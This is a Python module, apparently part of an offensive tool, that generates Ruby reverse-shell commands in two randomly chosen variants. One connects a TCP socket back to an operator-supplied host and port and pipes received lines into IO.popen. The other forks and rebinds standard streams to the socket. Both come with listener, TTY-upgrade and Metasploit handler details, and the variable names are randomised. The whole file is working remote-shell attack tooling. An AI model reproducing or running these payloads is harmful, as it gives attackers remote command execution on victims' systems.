import random
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT

_VARIANTS = ["tcpsocket", "socket_exec"]


class RubyGenerator(ShellGenerator):
    language = "ruby"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        if variant == "tcpsocket":
            cmd = self._tcpsocket(opts, names)
        else:
            cmd = self._socket_exec(opts, names)

        return ShellResult(
            command=cmd, variant=variant, language=self.language, arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_ruby", opts.lhost, opts.lport),
        )

    def _tcpsocket(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        return (
            f'ruby -rsocket -e \'{s}=TCPSocket.new("{opts.lhost}",{opts.lport});'
            f'while(c={s}.gets);IO.popen(c,"r"){{|f|{s}.print f.read}}end\''
        )

    def _socket_exec(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        return (
            f'ruby -rsocket -e \'exit if fork;'
            f'c=TCPSocket.new("{opts.lhost}",{opts.lport});'
            f'$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);'
            f'$stdin.each_line{{|l|l=l.strip;'
            f'next if l.length==0;'
            f'(IO.popen(l,"rb"){{|f|c.print f.read}}) rescue nil}}\''
        )
